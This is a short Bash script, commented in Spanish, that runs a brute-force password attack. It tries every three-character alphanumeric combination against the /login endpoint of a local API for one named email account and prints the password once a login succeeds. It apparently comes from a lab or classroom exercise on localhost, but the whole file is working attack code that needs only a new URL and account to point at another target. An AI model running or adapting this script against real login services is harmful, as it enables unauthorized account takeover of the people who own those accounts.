#!/bin/bash

API="http://localhost:8000"
email="daniel.pro@gmail.com"
caracteres="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
found=0
password_encontrada=""
intentos=0

echo "****Ataque para contraseña****"


probar_password() {
    local pass="$1"
    respuesta=$(curl -s -X POST "$API/login" \
        -H "Content-Type: application/json" \
        -d "{\"correo\":\"$email\", \"password\":\"$pass\"}")
    
    if echo "$respuesta" | grep -q "Login exitoso"; then
        return 0
    else
        return 1
    fi
}


for ((i=0; i<${#caracteres}; i++)); do
    for ((j=0; j<${#caracteres}; j++)); do
        for ((k=0; k<${#caracteres}; k++)); do
            intento="${caracteres:$i:1}${caracteres:$j:1}${caracteres:$k:1}"
            intentos=$((intentos+1))
            echo -n "Intento #$intentos: $intento"
            if probar_password "$intento"; then
                echo " "
                password_encontrada="$intento"
                found=1
                break 3
            else
                printf "\r\033[K"
            fi
        done
    done
done


echo ""
if [ $found -eq 1 ]; then
    echo " CONTRASEÑA ENCONTRADA: $password_encontrada"
else
    echo " CONTRASEÑA NO ENCONTRADA"
fi

echo "****Prueba terminada****"
